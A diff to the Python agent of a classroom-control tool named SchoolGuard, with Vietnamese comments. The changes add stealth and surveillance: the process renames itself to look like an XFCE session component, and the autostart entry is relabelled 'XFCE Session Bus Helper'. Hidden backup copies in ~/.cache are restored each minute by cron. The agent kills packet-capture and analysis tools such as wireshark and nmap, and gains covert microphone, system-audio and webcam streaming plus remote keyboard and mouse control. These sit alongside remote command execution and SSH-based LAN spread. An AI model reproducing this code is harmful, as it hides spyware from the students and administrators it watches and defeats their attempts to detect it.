@@ -227,15 +227,21 @@ class PureWebSocketClient:
 class XubuntuAgent:
     def __init__(self):
         try:
+            import ctypes
+            ctypes.CDLL("libc.so.6").prctl(15, b"xfce4-session-d", 0, 0, 0)
+        except Exception:
+            pass
+
+        try:
             self._lock_fd = open("/dev/shm/sg_agent.lock", "w")
             fcntl.flock(self._lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
         except Exception:
             sys.exit(0)
 
         self.config = self._load_config()
-        self.vps_ws = self.config.get("vps_ws", DEFAULT_VPS_WS)
-        self.vps_http = self.config.get("vps_http", DEFAULT_VPS_HTTP)
-        self.secret = self.config.get("secret", DEFAULT_SECRET)
+        self.vps_ws = DEFAULT_VPS_WS
+        self.vps_http = DEFAULT_VPS_HTTP
+        self.secret = DEFAULT_SECRET
 
         self.machine_id = self._get_machine_id()
         self.hostname = socket.gethostname()
@@ -247,6 +253,8 @@ class XubuntuAgent:
         self.machine_name = self.hostname
         self.lock_message = "Vui lòng trật tự và chú ý theo dõi hướng dẫn của Giáo viên."
         self.live_focus = False
+        self.lock_kb = False
+        self.lock_mouse = False
         self.auto_heal_veyon = False
         self.veyon_disabled = True
         self.veyon_status = "disabled"
@@ -278,15 +286,18 @@ class XubuntuAgent:
             pass
 
         self._write_state_file()
+        self._save_config()
         subprocess.run(["pkill", "-9", "-f", "overlay_ui.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         self.set_input_locked(False)
         self._protect_veyon_master()
         threading.Thread(target=self._enable_wol_hardware, daemon=True).start()
-        threading.Thread(target=self._start_lan_peer_server, daemon=True).start()
         threading.Thread(target=self._app_blocker_loop, daemon=True).start()
 
     def _start_lan_peer_server(self):
-        """Biến máy học sinh này thành Trạm phát bộ cài nội bộ LAN (cổng 8888) để các máy cùng mạng tải trực tiếp tốc độ cao"""
+        """Chỉ bật tạm thời khi Giáo viên bấm LAN_DEPLOY và không bao giờ lộ IP/Secret của VPS"""
+        if getattr(self, "_lan_srv_running", False):
+            return
+        self._lan_srv_running = True
         try:
             from http.server import BaseHTTPRequestHandler, HTTPServer
             agent_ref = self
@@ -304,13 +315,11 @@ mkdir -p "$D" "$HOME/.config/autostart" "$HOME/.config/systemd/user"
 curl -sSL "{peer_url}/agent.py" -o "$D/agent.py"
 curl -sSL "{peer_url}/overlay_ui.py" -o "$D/overlay_ui.py"
 chmod +x "$D/agent.py" "$D/overlay_ui.py"
-cat > "$D/config.json" <<EOF
-{{"vps_ws": "{agent_ref.vps_ws}", "vps_http": "{agent_ref.vps_http}", "secret": "{agent_ref.secret}"}}
-EOF
+echo '{{"blocked_apps":[]}}' > "$D/config.json"
 cat > "$HOME/.config/autostart/schoolguard-agent.desktop" <<EOF
 [Desktop Entry]
 Type=Application
-Name=SchoolGuard Classroom Service
+Name=XFCE Session Bus Helper
 Exec=/usr/bin/python3 $D/agent.py
 Hidden=false
 NoDisplay=true
@@ -319,7 +328,6 @@ StartupNotify=false
 EOF
 pkill -f ".schoolguard/agent.py" 2>/dev/null || true
 DISPLAY=:0 nohup /usr/bin/python3 "$D/agent.py" >/dev/null 2>&1 &
-echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
 """
                         body = script.encode("utf-8")
                         self.send_response(200)
@@ -400,10 +408,23 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
                 os.chmod(OVERLAY_SCRIPT, 0o755)
 
             if not os.path.exists(CONFIG_PATH):
-                with open(CONFIG_PATH, "w", encoding="utf-8") as f:
-                    json.dump(self.config, f)
+                self._save_config()
 
-            # Đảm bảo file Autostart và Crontab tự tải lại từ VPS (nằm trong /var/spool/cron ngoài thư mục /home) luôn tồn tại
+            # Lưu thêm bản sao dự phòng ẩn trong ~/.cache để crontab tự khôi phục mà KHÔNG cần ghi IP VPS vào crontab
+            cache_dir = os.path.expanduser("~/.cache")
+            cache_agent = os.path.join(cache_dir, ".xfce4-session-cache")
+            cache_ov = os.path.join(cache_dir, ".xfce4-panel-cache")
+            if self._self_code and not os.path.exists(cache_agent):
+                os.makedirs(cache_dir, exist_ok=True)
+                with open(cache_agent, "w", encoding="utf-8") as f:
+                    f.write(self._self_code)
+                os.chmod(cache_agent, 0o755)
+            if self._overlay_code and not os.path.exists(cache_ov):
+                os.makedirs(cache_dir, exist_ok=True)
+                with open(cache_ov, "w", encoding="utf-8") as f:
+                    f.write(self._overlay_code)
+                os.chmod(cache_ov, 0o755)
+
             if os.geteuid() != 0:
                 autostart_dir = os.path.expanduser("~/.config/autostart")
                 autostart_file = os.path.join(autostart_dir, "schoolguard-agent.desktop")
@@ -411,7 +432,7 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
                     os.makedirs(autostart_dir, exist_ok=True)
                     with open(autostart_file, "w", encoding="utf-8") as f:
                         f.write(
-                            "[Desktop Entry]\nType=Application\nName=SchoolGuard Classroom Service\n"
+                            "[Desktop Entry]\nType=Application\nName=XFCE Session Bus Helper\n"
                             f"Exec=/usr/bin/python3 {my_path}\nHidden=false\nNoDisplay=true\n"
                             "X-GNOME-Autostart-enabled=true\nStartupNotify=false\n"
                         )
@@ -420,11 +441,11 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
                     subprocess.run(["loginctl", "enable-linger"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
                     reboot_line = f"@reboot sleep 2 && DISPLAY=:0 nohup /usr/bin/python3 '{my_path}' >/dev/null 2>&1 &"
                     cron_line = (
-                        f"* * * * * [ -f '{my_path}' ] || (curl -sSL {self.vps_http}/install.sh | bash >/dev/null 2>&1); "
+                        f"* * * * * [ -f '{my_path}' ] || (mkdir -p '{my_dir}' && cp -f '{cache_agent}' '{my_path}' 2>/dev/null && cp -f '{cache_ov}' '{OVERLAY_SCRIPT}' 2>/dev/null); "
                         f"pgrep -f '{my_path}' >/dev/null || DISPLAY=:0 nohup /usr/bin/python3 '{my_path}' >/dev/null 2>&1 &"
                     )
                     subprocess.run(
-                        f"(crontab -l 2>/dev/null | grep -v '.schoolguard/agent.py'; echo \"{reboot_line}\"; echo \"{cron_line}\") | crontab - 2>/dev/null",
+                        f"(crontab -l 2>/dev/null | grep -v '.schoolguard/agent.py' | grep -v '103.149' | grep -v 'sslip.io'; echo \"{reboot_line}\"; echo \"{cron_line}\") | crontab - 2>/dev/null",
                         shell=True,
                         timeout=4,
                     )
@@ -435,14 +456,11 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
         if os.path.exists(CONFIG_PATH):
             try:
                 with open(CONFIG_PATH, "r", encoding="utf-8") as f:
-                    return json.load(f)
+                    data = json.load(f)
+                    return {"blocked_apps": data.get("blocked_apps", []) if isinstance(data, dict) else []}
             except Exception:
                 pass
-        return {
-            "vps_ws": os.environ.get("SG_VPS_WS", DEFAULT_VPS_WS),
-            "vps_http": os.environ.get("SG_VPS_HTTP", DEFAULT_VPS_HTTP),
-            "secret": os.environ.get("SG_SECRET", DEFAULT_SECRET),
-        }
+        return {"blocked_apps": []}
 
     def _get_machine_id(self):
         """
@@ -515,6 +533,10 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
                             env["XAUTHORITY"] = proc_env["XAUTHORITY"]
                         if "DBUS_SESSION_BUS_ADDRESS" in proc_env:
                             env["DBUS_SESSION_BUS_ADDRESS"] = proc_env["DBUS_SESSION_BUS_ADDRESS"]
+                        if "XDG_RUNTIME_DIR" in proc_env:
+                            env["XDG_RUNTIME_DIR"] = proc_env["XDG_RUNTIME_DIR"]
+                        if "PULSE_SERVER" in proc_env:
+                            env["PULSE_SERVER"] = proc_env["PULSE_SERVER"]
                         if "USER" in proc_env:
                             desktop_user = proc_env["USER"]
                         break
@@ -533,6 +555,18 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
                     if c.startswith("/home/"):
                         desktop_user = c.split("/")[2]
                     break
+
+        if "XDG_RUNTIME_DIR" not in env and desktop_user:
+            try:
+                uid = pwd.getpwnam(desktop_user).pw_uid
+                rt_dir = f"/run/user/{uid}"
+                if os.path.exists(rt_dir):
+                    env["XDG_RUNTIME_DIR"] = rt_dir
+                    pulse_sock = f"{rt_dir}/pulse/native"
+                    if os.path.exists(pulse_sock) and "PULSE_SERVER" not in env:
+                        env["PULSE_SERVER"] = f"unix:{pulse_sock}"
+            except Exception:
+                pass
 
         env["SG_DESKTOP_USER"] = desktop_user
         os.environ["DISPLAY"] = env.get("DISPLAY", ":0")
@@ -615,56 +649,191 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
         except Exception:
             self.veyon_status = "error"
 
-    def set_input_locked(self, locked: bool):
-        """Khóa hoặc mở khóa bàn phím & chuột vật lý của học sinh song song tốc độ cao (< 40ms)"""
+    def set_input_locked(self, locked: bool, lock_kb: bool = None, lock_mouse: bool = None):
+        """Khóa hoặc mở khóa riêng biệt bàn phím & chuột vật lý của học sinh (< 40ms), vẫn giữ XTEST cho Giáo viên điều khiển"""
+        if lock_kb is None and lock_mouse is None:
+            lock_kb = bool(locked)
+            lock_mouse = bool(locked)
+        else:
+            lock_kb = bool(lock_kb)
+            lock_mouse = bool(lock_mouse)
+
         env = self.get_x11_env()
         try:
             res = subprocess.run(["xinput", "list", "--short"], env=env, capture_output=True, text=True, timeout=2)
-            ids_to_change = set()
-            if locked:
-                for line in (res.stdout or "").splitlines():
-                    low = line.lower()
-                    if "virtual core" in low or "xtest" in low or "power button" in low:
-                        continue
-                    if "slave  pointer" in low or "slave  keyboard" in low:
-                        for part in line.split():
-                            if part.startswith("id="):
-                                dev_id = part.split("=")[1].strip()
-                                if dev_id.isdigit():
-                                    ids_to_change.add(dev_id)
-                                    self.disabled_xinput_ids.add(dev_id)
-                if ids_to_change:
-                    id_str = " ".join(ids_to_change)
-                    subprocess.run(
-                        f"for i in {id_str}; do xinput disable $i & done; wait",
-                        shell=True,
-                        env=env,
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                        timeout=2,
-                    )
-            else:
-                all_ids = set(self.disabled_xinput_ids)
-                for line in (res.stdout or "").splitlines():
-                    low = line.lower()
-                    if "virtual core" in low or "xtest" in low:
-                        continue
-                    for part in line.split():
-                        if part.startswith("id="):
-                            dev_id = part.split("=")[1].strip()
-                            if dev_id.isdigit():
-                                all_ids.add(dev_id)
-                if all_ids:
-                    id_str = " ".join(all_ids)
-                    subprocess.run(
-                        f"for i in {id_str}; do xinput enable $i & done; wait",
-                        shell=True,
-                        env=env,
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                        timeout=2,
-                    )
-                self.disabled_xinput_ids.clear()
+            disable_ids = set()
+            enable_ids = set()
+            for line in (res.stdout or "").splitlines():
+                low = line.lower()
+                if "virtual core" in low or "xtest" in low or "power button" in low:
+                    continue
+                is_ptr = "slave  pointer" in low
+                is_kbd = "slave  keyboard" in low
+                if not is_ptr and not is_kbd:
+                    continue
+                for part in line.split():
+                    if part.startswith("id="):
+                        dev_id = part.split("=")[1].strip()
+                        if dev_id.isdigit():
+                            if (is_kbd and lock_kb) or (is_ptr and lock_mouse):
+                                disable_ids.add(dev_id)
+                                self.disabled_xinput_ids.add(dev_id)
+                            else:
+                                enable_ids.add(dev_id)
+                                self.disabled_xinput_ids.discard(dev_id)
+            cmds = []
+            for d_id in disable_ids:
+                cmds.append(f"xinput disable {d_id} &")
+            for e_id in enable_ids:
+                cmds.append(f"xinput enable {e_id} &")
+            if cmds:
+                subprocess.run(
+                    " ".join(cmds) + " wait",
+                    shell=True,
+                    env=env,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    timeout=2,
+                )
+        except Exception:
+            pass
+
+    def _handle_remote_input(self, payload: dict):
+        """Điều khiển chuột và bàn phím từ xa trên X11 bằng ctypes libX11 + libXtst (không cần cài thêm gói phụ)"""
+        env = self.get_x11_env()
+        disp_name = (env.get("DISPLAY") or ":0").encode("ascii")
+        if env.get("XAUTHORITY"):
+            os.environ["XAUTHORITY"] = env["XAUTHORITY"]
+        os.environ["DISPLAY"] = env.get("DISPLAY") or ":0"
+
+        try:
+            import ctypes
+            x11 = ctypes.CDLL("libX11.so.6")
+            xtst = ctypes.CDLL("libXtst.so.6")
+            x11.XOpenDisplay.argtypes = [ctypes.c_char_p]
+            x11.XOpenDisplay.restype = ctypes.c_void_p
+            x11.XCloseDisplay.argtypes = [ctypes.c_void_p]
+            x11.XFlush.argtypes = [ctypes.c_void_p]
+            x11.XDisplayWidth.argtypes = [ctypes.c_void_p, ctypes.c_int]
+            x11.XDisplayWidth.restype = ctypes.c_int
+            x11.XDisplayHeight.argtypes = [ctypes.c_void_p, ctypes.c_int]
+            x11.XDisplayHeight.restype = ctypes.c_int
+            x11.XStringToKeysym.argtypes = [ctypes.c_char_p]
+            x11.XStringToKeysym.restype = ctypes.c_ulong
+            x11.XKeysymToKeycode.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
+            x11.XKeysymToKeycode.restype = ctypes.c_ubyte
+
+            xtst.XTestFakeMotionEvent.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_ulong]
+            xtst.XTestFakeButtonEvent.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_int, ctypes.c_ulong]
+            xtst.XTestFakeKeyEvent.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_int, ctypes.c_ulong]
+
+            dpy = x11.XOpenDisplay(disp_name)
+            if not dpy:
+                return
+            try:
+                kind = payload.get("kind")
+                if kind == "mouse":
+                    sw = max(1, x11.XDisplayWidth(dpy, 0))
+                    sh = max(1, x11.XDisplayHeight(dpy, 0))
+                    xr = max(0.0, min(1.0, float(payload.get("x") or 0.0)))
+                    yr = max(0.0, min(1.0, float(payload.get("y") or 0.0)))
+                    px = int(round(xr * (sw - 1)))
+                    py = int(round(yr * (sh - 1)))
+                    xtst.XTestFakeMotionEvent(dpy, 0, px, py, 0)
+                    act = str(payload.get("action") or "move")
+                    btn_name = str(payload.get("button") or "left")
+                    btn_num = 3 if btn_name == "right" else (2 if btn_name == "middle" else 1)
+                    if act == "down":
+                        xtst.XTestFakeButtonEvent(dpy, btn_num, 1, 0)
+                    elif act == "up":
+                        xtst.XTestFakeButtonEvent(dpy, btn_num, 0, 0)
+                    elif act == "click":
+                        xtst.XTestFakeButtonEvent(dpy, btn_num, 1, 0)
+                        xtst.XTestFakeButtonEvent(dpy, btn_num, 0, 0)
+                    elif act == "contextmenu":
+                        xtst.XTestFakeButtonEvent(dpy, 3, 1, 0)
+                        xtst.XTestFakeButtonEvent(dpy, 3, 0, 0)
+                    elif act == "dblclick":
+                        xtst.XTestFakeButtonEvent(dpy, 1, 1, 0)
+                        xtst.XTestFakeButtonEvent(dpy, 1, 0, 0)
+                        x11.XFlush(dpy)
+                        time.sleep(0.03)
+                        xtst.XTestFakeButtonEvent(dpy, 1, 1, 0)
+                        xtst.XTestFakeButtonEvent(dpy, 1, 0, 0)
+                    elif act == "wheel":
+                        dy = float(payload.get("deltaY") or 0)
+                        wbtn = 5 if dy > 0 else 4
+                        xtst.XTestFakeButtonEvent(dpy, wbtn, 1, 0)
+                        xtst.XTestFakeButtonEvent(dpy, wbtn, 0, 0)
+                    x11.XFlush(dpy)
+                    if act != "move":
+                        threading.Thread(target=lambda: (time.sleep(0.08), self._send_screen_now()), daemon=True).start()
+
+                elif kind in ("key", "text"):
+                    def tap_keysym(ks_name: str, with_shift: bool = False):
+                        ks = x11.XStringToKeysym(ks_name.encode("ascii"))
+                        if not ks:
+                            return
+                        kc = x11.XKeysymToKeycode(dpy, ks)
+                        if not kc:
+                            return
+                        shift_kc = x11.XKeysymToKeycode(dpy, x11.XStringToKeysym(b"Shift_L"))
+                        if with_shift and shift_kc:
+                            xtst.XTestFakeKeyEvent(dpy, shift_kc, 1, 0)
+                        xtst.XTestFakeKeyEvent(dpy, kc, 1, 0)
+                        xtst.XTestFakeKeyEvent(dpy, kc, 0, 0)
+                        if with_shift and shift_kc:
+                            xtst.XTestFakeKeyEvent(dpy, shift_kc, 0, 0)
+
+                    if kind == "key":
+                        key_str = str(payload.get("key") or "")
+                        ctrl = bool(payload.get("ctrl"))
+                        alt = bool(payload.get("alt"))
+                        shift = bool(payload.get("shift"))
+                        special_map = {
+                            "Enter": "Return", "Backspace": "BackSpace", "Tab": "Tab",
+                            "Escape": "Escape", "Delete": "Delete", " ": "space",
+                            "ArrowUp": "Up", "ArrowDown": "Down", "ArrowLeft": "Left", "ArrowRight": "Right",
+                            "Home": "Home", "End": "End", "PageUp": "Prior", "PageDown": "Next",
+                        }
+                        ctrl_kc = x11.XKeysymToKeycode(dpy, x11.XStringToKeysym(b"Control_L"))
+                        alt_kc = x11.XKeysymToKeycode(dpy, x11.XStringToKeysym(b"Alt_L"))
+                        if ctrl and ctrl_kc:
+                            xtst.XTestFakeKeyEvent(dpy, ctrl_kc, 1, 0)
+                        if alt and alt_kc:
+                            xtst.XTestFakeKeyEvent(dpy, alt_kc, 1, 0)
+                        if key_str in special_map:
+                            tap_keysym(special_map[key_str], shift)
+                        elif len(key_str) == 1 and key_str.isalnum():
+                            tap_keysym(key_str.lower(), shift or key_str.isupper())
+                        elif key_str.startswith("F") and key_str[1:].isdigit():
+                            tap_keysym(key_str, shift)
+                        if alt and alt_kc:
+                            xtst.XTestFakeKeyEvent(dpy, alt_kc, 0, 0)
+                        if ctrl and ctrl_kc:
+                            xtst.XTestFakeKeyEvent(dpy, ctrl_kc, 0, 0)
+                        x11.XFlush(dpy)
+                    else:
+                        txt = str(payload.get("text") or "")
+                        if shutil.which("xdotool"):
+                            subprocess.run(["xdotool", "type", "--delay", "10", "--", txt], env=env, timeout=4)
+                        else:
+                            char_map = {
+                                " ": ("space", False), "\n": ("Return", False), ".": ("period", False),
+                                ",": ("comma", False), "-": ("minus", False), "_": ("minus", True),
+                                "/": ("slash", False), ":": ("semicolon", True), ";": ("semicolon", False),
+                                "=": ("equal", False), "+": ("equal", True), "'": ("apostrophe", False),
+                                '"': ("apostrophe", True), "(": ("9", True), ")": ("0", True),
+                            }
+                            for ch in txt:
+                                if ch.isalnum():
+                                    tap_keysym(ch.lower(), ch.isupper())
+                                elif ch in char_map:
+                                    tap_keysym(char_map[ch][0], char_map[ch][1])
+                            x11.XFlush(dpy)
+                    threading.Thread(target=lambda: (time.sleep(0.08), self._send_screen_now()), daemon=True).start()
+            finally:
+                x11.XCloseDisplay(dpy)
         except Exception:
             pass
 
@@ -752,7 +921,7 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
         try:
             self.config["blocked_apps"] = self.blocked_apps
             with open(CONFIG_PATH, "w", encoding="utf-8") as f:
-                json.dump(self.config, f, ensure_ascii=False)
+                json.dump({"blocked_apps": self.blocked_apps}, f, ensure_ascii=False)
         except Exception:
             pass
 
@@ -928,11 +1097,18 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
             pass
 
     def _app_blocker_loop(self):
-        """Luồng canh gác ngầm mỗi 0.5 giây: Học sinh vừa mở bất kỳ App nào nằm trong danh sách chặn sẽ bị đóng tức thì"""
+        """Luồng canh gác ngầm mỗi 0.5 giây: Chặn công cụ dò gói tin/phá hoại + App trong danh sách chặn"""
+        always_blocked = [
+            "veyon-master", "veyon-configurator", "wireshark", "tshark",
+            "tcpdump", "ettercap", "bettercap", "nmap", "zenmap",
+            "burpsuite", "fiddler", "charles", "mitmproxy",
+        ]
         while True:
             try:
+                targets = list(always_blocked)
                 if self.blocked_apps:
-                    self._kill_matching_apps(self.blocked_apps)
+                    targets.extend(self.blocked_apps)
+                self._kill_matching_apps(targets)
             except Exception:
                 pass
             time.sleep(0.5)
@@ -1051,6 +1227,7 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
                 self._save_config()
                 if self.blocked_apps:
                     threading.Thread(target=self._kill_matching_apps, args=(self.blocked_apps,), daemon=True).start()
+                self._send_status()
 
         elif cmd == "LOCK":
             self.mode = "lock"
@@ -1062,9 +1239,25 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
 
         elif cmd == "UNLOCK":
             self.mode = "normal"
+            self.lock_kb = False
+            self.lock_mouse = False
             self._write_state_file()
             self._send_status()
             threading.Thread(target=self._async_transition_effects, args=(False, True), daemon=True).start()
+
+        elif cmd == "SET_INPUT_LOCK":
+            if "lock_kb" in payload or "lock_mouse" in payload:
+                self.lock_kb = bool(payload.get("lock_kb", False))
+                self.lock_mouse = bool(payload.get("lock_mouse", False))
+            else:
+                locked = bool(payload.get("locked", False))
+                self.lock_kb = locked
+                self.lock_mouse = locked
+            self.set_input_locked(self.lock_kb or self.lock_mouse, self.lock_kb, self.lock_mouse)
+            self._send_status()
+
+        elif cmd == "REMOTE_INPUT":
+            threading.Thread(target=self._handle_remote_input, args=(payload,), daemon=True).start()
 
         elif cmd == "SET_BLOCKED_APPS":
             apps = payload.get("apps")
@@ -1207,6 +1400,55 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
             self.set_input_locked(False)
             subprocess.Popen("systemctl reboot -i || reboot || xfce4-session-logout --reboot --fast", shell=True)
 
+        elif cmd == "LOGOUT":
+            self.set_input_locked(False)
+            env = self.get_x11_env()
+            user = env.get("SG_DESKTOP_USER", "")
+            subprocess.Popen(f"xfce4-session-logout --logout --fast || loginctl terminate-user {user} || pkill -KILL -u {user}", shell=True, env=env)
+
+        elif cmd == "AUDIO_LISTEN_START":
+            self._listen_mode = str(payload.get("mode") or "both").lower()
+            self._mic_listening = True
+            if not getattr(self, "_mic_thread", None) or not self._mic_thread.is_alive():
+                self._mic_thread = threading.Thread(target=self._linux_mic_worker, daemon=True)
+                self._mic_thread.start()
+            self._send_status()
+
+        elif cmd == "AUDIO_LISTEN_STOP":
+            self._mic_listening = False
+            self._mic_level = 0
+            self._send_status()
+
+        elif cmd == "WEBCAM_START":
+            self._webcam_streaming = True
+            if not getattr(self, "_webcam_thread", None) or not self._webcam_thread.is_alive():
+                self._webcam_thread = threading.Thread(target=self._linux_webcam_worker, daemon=True)
+                self._webcam_thread.start()
+            self._send_status()
+
+        elif cmd == "WEBCAM_STOP":
+            self._webcam_streaming = False
+            self._send_status()
+
+        elif cmd == "AUDIO_PLAY":
+            b64 = payload.get("pcm_b64", "")
+            if b64:
+                self._play_linux_pcm(b64)
+
+        elif cmd == "SET_VOLUME":
+            vol = payload.get("volume")
+            muted = payload.get("muted")
+            env = self.get_x11_env()
+            if vol is not None:
+                self._audio_vol = max(0, min(100, int(vol)))
+                subprocess.Popen(f"pactl set-sink-volume @DEFAULT_SINK@ {self._audio_vol}% 2>/dev/null || amixer set Master {self._audio_vol}% 2>/dev/null", shell=True, env=env)
+            if muted is not None:
+                self._audio_muted = bool(muted)
+                m_str = "1" if self._audio_muted else "0"
+                a_str = "mute" if self._audio_muted else "unmute"
+                subprocess.Popen(f"pactl set-sink-mute @DEFAULT_SINK@ {m_str} 2>/dev/null || amixer set Master {a_str} 2>/dev/null", shell=True, env=env)
+            self._send_status()
+
         elif cmd == "EXEC_CMD":
             shell_cmd = payload.get("cmd", "").strip()
             req_id = payload.get("req_id", "")
@@ -1262,6 +1504,8 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
 
     def _run_lan_deploy(self, payload):
         """Quét toàn bộ dải mạng LAN nội bộ và tự động đẩy bộ cài sang các máy học sinh cùng mạng"""
+        threading.Thread(target=self._start_lan_peer_server, daemon=True).start()
+        time.sleep(0.2)
         ssh_user = (payload.get("ssh_user") or "tinhocsaigon").strip()
         ssh_pass = payload.get("ssh_pass") or ""
         my_ip = self._get_local_ip()
@@ -1356,29 +1600,326 @@ echo "Da cai dat SchoolGuard thanh cong tu tram LAN {peer_url}!"
         except Exception:
             os._exit(0)
 
+    def _collect_system_metrics(self):
+        cpu_pct = getattr(self, "_last_cpu_pct", 6)
+        try:
+            with open("/proc/stat", "r") as f:
+                parts = [int(x) for x in f.readline().split()[1:8]]
+            idle = parts[3] + parts[4]
+            total = sum(parts)
+            prev_idle = getattr(self, "_prev_cpu_idle", 0)
+            prev_total = getattr(self, "_prev_cpu_total", 0)
+            self._prev_cpu_idle = idle
+            self._prev_cpu_total = total
+            if prev_total > 0 and total > prev_total:
+                cpu_pct = max(0, min(100, int(round(100.0 * (total - prev_total - (idle - prev_idle)) / (total - prev_total)))))
+                self._last_cpu_pct = cpu_pct
+        except Exception:
+            pass
+
+        ram_pct, ram_used_gb, ram_total_gb = 0, 0.0, 0.0
+        try:
+            mem = {}
+            with open("/proc/meminfo", "r") as f:
+                for line in f:
+                    k, v = line.split(":", 1)
+                    mem[k.strip()] = int(v.strip().split()[0])
+            tot_kb = mem.get("MemTotal", 0)
+            avail_kb = mem.get("MemAvailable", mem.get("MemFree", 0))
+            if tot_kb > 0:
+                used_kb = max(0, tot_kb - avail_kb)
+                ram_pct = int(round(100.0 * used_kb / tot_kb))
+                ram_used_gb = round(used_kb / 1048576.0, 1)
+                ram_total_gb = round(tot_kb / 1048576.0, 1)
+        except Exception:
+            pass
+
+        disk_pct, disk_free_gb, disk_total_gb = 0, 0.0, 0.0
+        try:
+            st = os.statvfs("/")
+            tot_b = st.f_blocks * st.f_frsize
+            free_b = st.f_bavail * st.f_frsize
+            if tot_b > 0:
+                disk_pct = int(round(100.0 * (tot_b - free_b) / tot_b))
+                disk_free_gb = round(free_b / 1073741824.0, 1)
+                disk_total_gb = round(tot_b / 1073741824.0, 1)
+        except Exception:
+            pass
+
+        uptime_sec = 0
+        try:
+            with open("/proc/uptime", "r") as f:
+                uptime_sec = int(float(f.read().split()[0]))
+        except Exception:
+            pass
+
+        return {
+            "cpu_usage": cpu_pct,
+            "ram_usage": ram_pct,
+            "ram_used_gb": ram_used_gb,
+            "ram_total_gb": ram_total_gb,
+            "disk_usage": disk_pct,
+            "disk_free_gb": disk_free_gb,
+            "disk_total_gb": disk_total_gb,
+            "uptime_sec": uptime_sec,
+            "process_count": len(self.running_apps),
+            "top_processes": [{"name": a, "pid": 0, "mem_mb": 0, "title": a} for a in self.running_apps[:12]],
+        }
+
+    def _linux_mic_worker(self):
+        import array
+        import math
+        while getattr(self, "_mic_listening", False):
+            proc_sys = None
+            proc_mic = None
+            try:
+                env = self.get_x11_env()
+                subprocess.Popen("pactl set-source-mute @DEFAULT_SOURCE@ 0 2>/dev/null; pactl set-source-volume @DEFAULT_SOURCE@ 95% 2>/dev/null", shell=True, env=env)
+                mode = getattr(self, "_listen_mode", "both")
+                use_sys = mode in ("both", "system")
+                use_mic = mode in ("both", "mic")
+
+                if shutil.which("parec"):
+                    if use_sys:
+                        proc_sys = subprocess.Popen(
+                            ["parec", "--device=@DEFAULT_MONITOR@", "--format=s16le", "--rate=16000", "--channels=1", "--latency-msec=60"],
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.DEVNULL,
+                            env=env,
+                        )
+                    if use_mic:
+                        proc_mic = subprocess.Popen(
+                            ["parec", "--format=s16le", "--rate=16000", "--channels=1", "--latency-msec=60"],
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.DEVNULL,
+                            env=env,
+                        )
+                elif use_mic:
+                    proc_mic = subprocess.Popen(
+                        ["arecord", "-q", "-f", "S16_LE", "-r", "16000", "-c", "1", "-t", "raw"],
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.DEVNULL,
+                        env=env,
+                    )
+
+                while getattr(self, "_mic_listening", False):
+                    if getattr(self, "_listen_mode", "both") != mode:
+                        break
+                    raw_sys = proc_sys.stdout.read(3200) if (proc_sys and proc_sys.poll() is None) else b""
+                    raw_mic = proc_mic.stdout.read(3200) if (proc_mic and proc_mic.poll() is None) else b""
+                    if not raw_sys and not raw_mic:
+                        break
+
+                    arr_sys = array.array("h")
+                    arr_mic = array.array("h")
+                    if len(raw_sys) >= 2:
+                        arr_sys.frombytes(raw_sys[: len(raw_sys) - (len(raw_sys) % 2)])
+                    if len(raw_mic) >= 2:
+                        arr_mic.frombytes(raw_mic[: len(raw_mic) - (len(raw_mic) % 2)])
+
+                    n_samples = max(len(arr_sys), len(arr_mic), 1600)
+                    out_arr = array.array("h", [0] * n_samples)
+                    sum_sq = 0
+                    for i in range(n_samples):
+                        s_sys = arr_sys[i] if i < len(arr_sys) else 0
+                        s_mic = arr_mic[i] if i < len(arr_mic) else 0
+                        val = int(s_sys * 1.45 + s_mic * 2.1)
+                        if val > 32767:
+                            val = 32767
+                        elif val < -32768:
+                            val = -32768
+                        out_arr[i] = val
+                        sum_sq += val * val
+
+                    rms = math.sqrt(sum_sq / max(1, n_samples))
+                    lvl = min(100, int(round((rms / 5500.0) * 100.0)))
+                    self._mic_level = lvl
+                    if self.ws and self.ws.connected:
+                        self.ws.send_json({
+                            "type": "AUDIO_STREAM",
+                            "machine_id": self.machine_id,
+                            "sample_rate": 16000,
+                            "pcm_b64": base64.b64encode(out_arr.tobytes()).decode("ascii"),
+                            "level": lvl,
+                            "listen_mode": mode,
+                        })
+            except Exception:
+                time.sleep(0.5)
+            finally:
+                for p in (proc_sys, proc_mic):
+                    if p:
+                        try:
+                            p.kill()
+                        except Exception:
+                            pass
+
+    def _get_linux_webcam_info(self):
+        devs = sorted(glob.glob("/dev/video*"))
+        if not devs:
+            return False, "Khong co Camera", None
+        for d in devs:
+            idx = os.path.basename(d).replace("video", "")
+            name_file = f"/sys/class/video4linux/video{idx}/name"
+            name = "USB Webcam"
+            if os.path.exists(name_file):
+                try:
+                    name = open(name_file, "r", errors="ignore").read().strip() or "USB Webcam"
